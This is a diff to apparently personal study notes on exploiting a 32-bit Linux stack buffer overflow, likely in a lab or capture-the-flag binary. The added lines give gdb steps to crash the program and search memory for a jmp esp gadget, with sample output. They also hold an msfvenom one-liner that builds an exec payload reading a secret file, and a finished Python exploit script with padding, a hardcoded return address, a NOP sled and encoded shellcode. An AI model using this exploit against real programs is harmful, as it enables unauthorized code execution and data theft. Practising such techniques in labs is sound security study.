@@ -415,9 +415,13 @@ Stopped reason: SIGSEGV
 
    	unset env COLUMNS
 
-# Crash program
+# Crash program (Within env - gdb) 
 
-# See mem map
+Enter "run"
+
+Enter long string of characters to break program
+
+# See mem map (in regular gdb)
 
 	info proc map
 
@@ -444,13 +448,47 @@ Mapped address spaces:
 	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
 ```
 
+# Find Range
+
+start at line beneath [heap] to end of [stack]
+
+e.g. 0xf7de1000 - 0xffffe000
 
 # Search Memory starting at bottom of heap going down
 
 	find /b <Top Mem Location> , <Bot Mem Location>, 0xff, 0xe4
 
  0xff = jump 0xe4 = jump esp 
+```
+Program received signal SIGSEGV, Segmentation fault.
+0x61616161 in ?? ()
+(gdb) find /b 0xf7de1000 , 0xffffe000, 0xff, 0xe4
+0xf7de3b59
+0xf7f588ab
+0xf7f645fb
+0xf7f6460f
+0xf7f64aeb
+0xf7f64aff
+0xf7f64d6f
+0xf7f64f97
+0xf7f650cf
+0xf7f65343
+0xf7f65497
+0xf7f655cf
+0xf7f65777
+0xf7f659ef
+0xf7f662eb
+0xf7f6649b
+0xf7f66533
+0xf7f66633
+0xf7f66b3b
+0xf7f66b8b
+0xf7f66cdb
+0xf7f67033
+0xf7f67203
+0xf7f67293
 
+```
 
 # Start metasploit
  msfconsole
@@ -468,3 +506,39 @@ generate -b "\x00" -f python
 ***take buf and copy into script***
 
 run <<< $(python test.py)
+
+# **OR**
+ 
+# Venom One Liner
+
+msfvenom -p linux/x86/exec CMD="whoami && cat /.secret/.verysecret.pdb" -b '\x00' -f python 
+
+
+# Final Script
+```
+buffer = "A" * 76
+
+eip = "\x51\x1b\xdf\xf7"
+
+nop = '\x90' * 5
+
+buf =  b""
+buf += b"\xd9\xeb\xba\x16\xea\x0d\x98\xd9\x74\x24\xf4\x5e"
+buf += b"\x33\xc9\xb1\x13\x31\x56\x19\x03\x56\x19\x83\xc6"
+buf += b"\x04\xf4\x1f\x67\x93\xa0\x46\x2a\xc5\x38\x54\xa8"
+buf += b"\x80\x5f\xce\x01\xe0\xf7\x0f\x36\x29\x65\x79\xa8"
+buf += b"\xbc\x8a\x2b\xdc\x98\x4c\xcc\x1c\x90\x24\xa3\x7d"
+buf += b"\x33\xdd\x1b\x58\xed\x3d\x3f\xc5\x85\x1d\x90\x2b"
+buf += b"\x15\x38\x8d\x41\xbc\xb6\x7e\x88\x48\x53\xf3\xad"
+buf += b"\xc7\xfe\x90\x3f\x4d\x74\x79\xb0\xe9\x16\x85\x67"
+buf += b"\xa1\x5f\x64\x4a\xc5"
+
+print(buffer + eip + nop + buf)
+
+```
+
+# On New Box
+
+Run gdb against script against and see output, modify as needed
+
+
